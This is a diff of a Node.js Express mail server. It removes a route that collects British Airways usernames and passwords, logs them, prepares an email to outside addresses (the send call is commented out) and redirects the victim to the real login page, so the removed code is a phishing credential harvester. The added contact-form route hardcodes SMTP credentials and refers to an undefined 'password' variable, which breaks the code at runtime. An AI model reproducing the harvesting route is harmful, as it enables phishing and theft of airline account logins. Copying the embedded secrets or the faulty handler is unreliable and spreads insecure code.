@@ -1,43 +1,49 @@
 const express = require("express");
 const nodeMailer = require("nodemailer");
-const cors = require("cors");
+
 
 const transporter = nodeMailer.createTransport({
-  service: "Gmail",
-  host: "smtp.gmail.com",
+  host: "truongllc.pro",
   port: 465,
   secure: true,
   auth: {
-    user: "herbertharthur80@gmail.com",
-    pass: "toea aqhr eeyb ocdv",
+    user: "clients@truongllc.pro",
+    pass: "Herberth1624$",
   },
 });
 
 const app = express();
 
-app.use(cors());
+app.use(express.json())
+app.use(express.urlencoded({ extended: true }));
 
-app.use(express.static("public"));
 
-app.get("/sendInfo", (req, res) => {
-  const { username, password } = req.query;
+app.post("/api/contact-us", (req, res) => {
+  const { firstName, lastName, email, tel, orgName, address, industryInfo, position, message } = req.body;
 
-  const mailOptions = {
-    from: "herbertharthur80@gmail.com",
-    to: ["kendrickarthur9@gmail.com","Bumperdown@gmail.com"],
-    subject: "British Airways user details",
-    text: `username:${username}  password:${password}`,
-  };
+  if (firstName && lastName && email && tel && orgName && address && industryInfo && position && message) {
+    const mailOptions = {
+      from: "clients@truongllc.pro",
+      to: "info@truongllc.pro",
+      subject: "Message From A Client",
+      text: `CleintDetails \n \n firstName:${firstName}  lastName:${password} \n email:${email}  address:${address} \n industryInfo:${industryInfo}  position:${position} \n message:${message}`,
+    };
 
-    // transporter.sendMail(mailOptions, (error, info) => {
-    //   if (error) {
-    //     console.error("Error sending email: ", error);
-    //   } else {
-    //     console.log("Email sent: ", info.response);
-    //   }
-    // });
-  console.log(`New data from britis airlines Username:${username} Password:${password}`);
-  res.redirect("https://accounts.britishairways.com/u/login ");
+    transporter.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        console.error("Error sending email: ", error);
+        res.status(500).json({message:"Server Error"})
+      } else {
+        console.log("Email sent: ", info.response);
+        res.status(200).json({ message: "Message Submited successfully" });
+      }
+    });
+  }
+
+
+  else{
+    res.status(400).json({ message: "Some fields are empty" });
+  }
 });
 
 const port = process.env.PORT ? process.env.PORT : 80;
